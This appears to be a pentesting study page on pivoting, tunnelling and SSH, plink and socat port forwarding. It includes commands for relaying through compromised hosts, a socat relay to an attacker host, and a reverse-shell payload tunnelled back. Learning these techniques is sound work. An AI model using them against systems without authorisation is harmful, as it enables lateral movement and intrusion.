# Pivoting, Tunnelling and Port Forwarding



* **Pivoting:** Pivoting's primary use is to defeat segmentation (both physically and virtually) to access an isolated network.
* **Tunneling:** Tunneling encapsulates network traffic into another protocol and routes traffic through it.
* **Lateral Movement:** Lateral movement can be described as a technique used to further access to our additional `hosts`, `applications` and `services`.&#x20;
* **Port Forwarding:** Port forwarding is a technique that allows us to redirect a communication request from one port to another.&#x20;

## Types of Port Forwarding

### 1. Local Port Forwarding (`-L`)

**Purpose:** Access a **remote/internal service** from **your own machine**.

**Flow:**

```
Your PC ---> SSH Server ---> Internal Service
```

Example:

```
ssh -L 8080:192.168.1.10:80 user@jump-server
```

Now when you open:

```
http://localhost:8080
```

it actually connects to:

```
192.168.1.10:80
```

through the SSH tunnel.

**Use in Pentesting**

* Access internal web applications.
* Access internal databases.
* Access RDP/SSH services hidden behind a jump host.

### 2. Dynamic Port Forwarding (`-D`)

**Purpose:** Create a **SOCKS proxy** so **any application** can access the remote network.

**Flow:**

```
Browser/Proxychains
        │
        ▼
localhost:1080 (SOCKS Proxy)
        │
        ▼
SSH Server
        │
        ▼
Any Internal Host
```

Example:

```
ssh -D 1080 user@jump-server
```

Now configure your browser or Proxychains to use:

```
127.0.0.1:1080
```

Every connection is routed through the SSH server.

**Use in Pentesting**

* Browse internal websites.
* Run tools like `proxychains nmap`.
* Reach multiple internal machines without creating many tunnels.

### 3. Remote Port Forwarding (`-R`)

**Purpose:** Allow the **remote server** to access a service running on **your local machine**.

**Flow:**

```
Remote Server ---> SSH Tunnel ---> Your PC
```

Example:

```
ssh -R 8080:localhost:80 user@server
```

Now someone on the server can access:

```
localhost:8080
```

and it actually reaches

```
your-PC:80
```

**Use in Pentesting**

* Expose a local web server to a compromised machine.
* Receive reverse shells when the target cannot directly reach your machine.
* Share local tools/files with the remote host.

### Quick Memory Trick

<table><thead><tr><th width="142.60003662109375">Type</th><th width="170">Direction</th><th>Who accesses what?</th></tr></thead><tbody><tr><td><strong>Local (-L)</strong></td><td>Remote → Local</td><td><strong>You</strong> access a remote/internal service.</td></tr><tr><td><strong>Dynamic (-D)</strong></td><td>Remote → Local</td><td><strong>You</strong> get a SOCKS proxy to access many remote services.</td></tr><tr><td><strong>Remote (-R)</strong></td><td>Local → Remote</td><td><strong>The remote host</strong> accesses a service running on your machine.</td></tr></tbody></table>

#### One-line summary

* **Local (`-L`)** → _I want to reach their service._
* **Dynamic (`-D`)** → _I want a proxy into their network._
* **Remote (`-R`)** → _They need to reach my service._

## Local Port Forwarding&#x20;

### Local Destination&#x20;

<figure><img src="../.gitbook/assets/image (1755).png" alt=""><figcaption></figcaption></figure>

### Remote Destination&#x20;

<figure><img src="../.gitbook/assets/image (1763).png" alt=""><figcaption></figcaption></figure>

### Using SSH (Local Port)

#### Before Port Forwarding&#x20;

<figure><img src="../.gitbook/assets/image (1756).png" alt=""><figcaption></figcaption></figure>

#### After Port Forwarding

{% code overflow="wrap" %}
```bash
ssh -L 8080:localhost:80 r0b@192.168.52.131
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1757).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
**Multiple Port Forwarding:**&#x20;

_You can forward multiple ports using below command._&#x20;

{% code overflow="wrap" %}
```bash
ssh -L <local port>:<compromised host ip>:<remote port> -L <....> <username>@<IP>
```
{% endcode %}
{% endhint %}

### Using SSH (Remote Port)

{% code overflow="wrap" %}
```bash
ssh -L 3389:192.168.16.111:3389 r0b@192.168.52.131
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1762).png" alt=""><figcaption></figcaption></figure>

### Using socat&#x20;

_We've to run this tool from the compromised host/pivot._&#x20;

{% code overflow="wrap" %}
```bash
socat TCP4-LISTEN:<attacker port>,fork TCP4:<remote host>:<remote host port>
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1788).png" alt=""><figcaption></figcaption></figure>

<details>

<summary><strong>Intermediate Process</strong></summary>

<figure><img src="../.gitbook/assets/image (1789).png" alt=""><figcaption></figcaption></figure>

</details>

<figure><img src="../.gitbook/assets/image (1790).png" alt=""><figcaption></figcaption></figure>

## Dynamic Port Forwarding&#x20;

<figure><img src="../.gitbook/assets/image (1759).png" alt=""><figcaption></figcaption></figure>

### Using SSH Tunneling over SOCKS (Linux)

#### Creating Tunnel

{% code overflow="wrap" %}
```bash
ssh -D <local port> rob@192.168.52.131
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1758).png" alt=""><figcaption></figcaption></figure>

#### Using Tunnel&#x20;

<figure><img src="../.gitbook/assets/image (1760).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (1761).png" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
**⚠️ Warning**

&#x20;_Nmap scans through SSH Dynamic Port Forwarding (SOCKS/Proxychains) can be unreliable; perform port scanning from the compromised pivot host itself, then use Dynamic Port Forwarding to access the discovered services locally._
{% endhint %}

### Using SSH tunneling over Proxifier (Windows)

#### Creating tunnel&#x20;

{% code overflow="wrap" %}
```cmd
plink -ssh -D 9050 r0b@192.168.16.142
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1791).png" alt=""><figcaption></figcaption></figure>

#### Setup SOCKS proxy&#x20;

_Install Proxifier Tool and add Proxy server from the Profile tab._&#x20;

<figure><img src="../.gitbook/assets/image (1792).png" alt=""><figcaption></figcaption></figure>

#### Using Tunnel&#x20;

<figure><img src="../.gitbook/assets/image (1793).png" alt=""><figcaption></figcaption></figure>

## Remote Port Forwarding&#x20;

<figure><img src="../.gitbook/assets/image (1768).png" alt=""><figcaption></figcaption></figure>

### Using SSH&#x20;

{% code overflow="wrap" %}
```bash
ssh -R <Internal IP>:<local port of internal IP>:<attacker's listener>:<port> ubuntu@<target>
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1765).png" alt=""><figcaption></figcaption></figure>

<details>

<summary><strong>Intermediate Process</strong></summary>

We've created metasploit payload that will connect to `192.168.16.142:5080` which in turns connect to our local port `4444`.&#x20;

<figure><img src="../.gitbook/assets/image (1766).png" alt=""><figcaption></figcaption></figure>

</details>

<figure><img src="../.gitbook/assets/image (1767).png" alt=""><figcaption></figcaption></figure>

### Using Socat&#x20;

_We've to run this tool from the compromised host/pivot._&#x20;

{% code overflow="wrap" %}
```bash
socat TCP4-LISTEN:<local port>,fork TCP4:<attacker host>:<attacker port>
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1785).png" alt=""><figcaption></figcaption></figure>

<details>

<summary><strong>Intermediate Process</strong></summary>

<figure><img src="../.gitbook/assets/image (1786).png" alt=""><figcaption></figcaption></figure>

</details>

<figure><img src="../.gitbook/assets/image (1787).png" alt=""><figcaption></figcaption></figure>

## Meterpreter Tunneling and Port Forwarding&#x20;

[Go To Metasploit Framework](tools/metasploit-framework.md#maintaining-persistence)

